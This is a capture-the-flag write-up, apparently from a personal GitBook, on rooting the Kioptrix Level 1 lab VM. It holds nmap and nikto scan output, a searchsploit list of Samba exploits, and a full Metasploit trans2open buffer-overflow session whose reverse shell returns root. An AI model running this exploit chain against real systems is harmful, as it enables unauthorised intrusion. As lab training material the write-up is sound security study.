# Kioptrix Level 1

Find the kioptrix box on my network

```
netdiscover -f # f for fastmode
```

Now run a aggressive nmap scan to see whats running

```
nmap -A 192.168.12.105

Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 08:10 EDT
Nmap scan report for 192.168.12.105
Host is up (0.00023s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2025-07-13T16:11:20+00:00; +4h00m01s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:95:A2:0D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 4h00m00s

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.12.105
```

Visited website on port 80 since open but seems to be just a test page

<figure><img src="../../.gitbook/assets/Screenshot from 2025-07-13 07-15-59.png" alt=""><figcaption></figcaption></figure>

Going to run nikto to scan and see any vulnerabilities

```
nikto -h http://192.168.12.105

+ Target IP:          192.168.12.105
+ Target Hostname:    192.168.12.105
+ Target Port:        80
+ Start Time:         2025-07-13 08:18:31 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /test.php: This might be interesting.
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8908 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2025-07-13 08:18:45 (GMT-4) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Next we will check out  139/tcp   open  netbios-ssn Samba smbd\


Lets find the version of samba:

```
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: When in a module, use back to go back to the top level 
prompt
                                                  

  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v6.4.64-dev                          ]
+ -- --=[ 2519 exploits - 1296 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version  .                normal  No     SMB Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com
                                       /docs/using-metasploit/basics/using-metasploit.html
   RPORT                     no        The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.12.105
rhosts => 192.168.12.105
msf6 auxiliary(scanner/smb/smb_version) > exploit
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.16/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.12.105:139    -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.12.105        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

They are using more than likely version: Samba 2.2.1a

Using msfconsole to look for exploit for samba

```
searchsploit samba
[*] exec: searchsploit samba

---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote File Inclu | php/webapps/4575.txt
Microsoft Windows XP/2003 - Samba Share Resource Exhausti | windows/dos/148.sh
Samba 1.9.19 - 'Password' Remote Buffer Overflow          | linux/remote/20308.c
Samba 2.0.7 - SWAT Logfile Permissions                    | linux/local/20341.sh
Samba 2.0.7 - SWAT Logging Failure                        | unix/remote/20340.c
Samba 2.0.7 - SWAT Symlink (1)                            | linux/local/20338.c
Samba 2.0.7 - SWAT Symlink (2)                            | linux/local/20339.sh
Samba 2.0.x - Insecure TMP File Symbolic Link             | linux/local/20776.c
Samba 2.0.x/2.2 - Arbitrary File Creation                 | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasplo | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (M | linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Met | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Shar | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (M | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Met | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflo | solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution | linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1 | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2 | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3 | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4 | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)      | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling B | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                      | linux/remote/7.pl
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow ( | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass    | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Me | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overfl | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow  | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overfl | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow          | linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruptio | linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass             | linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEve | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                 | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)    | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                     | linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                       | linux/remote/42060.py
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflo | linux/dos/27778.txt
Samba 4.5.2 - Symlink Race Permits Opening Files Outside  | multiple/remote/41740.txt
Samba < 2.0.5 - Local Overflow                            | linux/local/19428.c
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution         | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                     | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)             | linux_x86/dos/36741.py
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service   | windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access                     | cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI                      | windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI                 | windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwrite        | multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Password Protect | multiple/remote/21027.txt
Sambar Server 5.1 - Sample Script Denial of Service       | windows/dos/21228.c
Sambar Server 5.1 - Script Source Disclosure              | cgi/remote/21390.txt
Sambar Server 5.x - 'results.stm' Cross-Site Scripting    | windows/remote/22185.txt
Sambar Server 5.x - Information Disclosure                | windows/remote/22434.txt
Sambar Server 5.x - Open Proxy / Authentication Bypass    | windows/remote/24076.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross | windows/remote/25694.txt
Sambar Server 5.x/6.0/6.1 - logout RCredirect Cross-Site  | windows/remote/25695.txt
Sambar Server 5.x/6.0/6.1 - Server Referer Cross-Site Scr | windows/remote/25696.txt
Sambar Server 6 - Search Results Buffer Overflow (Metaspl | windows/remote/16756.rb
Sambar Server 6.0 - 'results.stm' POST Buffer Overflow    | windows/dos/23664.py
Sambar Server 6.1 Beta 2 - 'show.asp?show' Cross-Site Scr | windows/remote/24161.txt
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File A | windows/remote/24163.txt
Sambar Server 6.1 Beta 2 - 'showperf.asp?title' Cross-Sit | windows/remote/24162.txt
SWAT Samba Web Administration Tool - Cross-Site Request F | cgi/webapps/17577.txt
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```
msf6 > search trans2open

Matching Modules
================

   #  Name                                                         Disclosure Date  Rank   Check  Description
   -  ----                                                         ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/solaris/samba/trans2open
After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'                                  .                .          .      .


Interact with a module by name or index. For example info 77, use 77 or use exploit/windows/http/sambar6_search_results                                                                 
After interacting with a module you can manually set a TARGET with set TARGET 'Windows XP'

                                                                  
```

We will use the exploit from the above search: exploit/linux/samba/trans2open

```
msf6 > use exploit/linux/samba/trans2open
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > set rhost 192.168.12.105
rhost => 192.168.12.105
msf6 exploit(linux/samba/trans2open) > set lhost 192.168.12.102
lhost => 192.168.12.102
msf6 exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.12.105   yes       The target host(s), see https://docs.metasploit.com/
                                      docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.12.102   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > 
msf6 exploit(linux/samba/trans2open) > exploit
[*] Started reverse TCP handler on 192.168.12.102:4444 
[*] 192.168.12.105:139 - Trying return address 0xbffffdfc...
[*] 192.168.12.105:139 - Trying return address 0xbffffcfc...
[*] 192.168.12.105:139 - Trying return address 0xbffffbfc...
[*] 192.168.12.105:139 - Trying return address 0xbffffafc...
[*] 192.168.12.105:139 - Trying return address 0xbffff9fc...
[*] 192.168.12.105:139 - Trying return address 0xbffff8fc...
[*] 192.168.12.105:139 - Trying return address 0xbffff7fc...
[*] 192.168.12.105:139 - Trying return address 0xbffff6fc...
[*] Command shell session 1 opened (192.168.12.102:4444 -> 192.168.12.105:32769) at 2025-07-13 08:41:13 -0400

[*] Command shell session 2 opened (192.168.12.102:4444 -> 192.168.12.105:32770) at 2025-07-13 08:41:14 -0400
[*] Command shell session 3 opened (192.168.12.102:4444 -> 192.168.12.105:32771) at 2025-07-13 08:41:15 -0400
[*] Command shell session 4 opened (192.168.12.102:4444 -> 192.168.12.105:32772) at 2025-07-13 08:41:16 -0400
whoami
root
ls
id
uid=0(root) gid=0(root) groups=99(nobody)

```

We completed the box and got root.
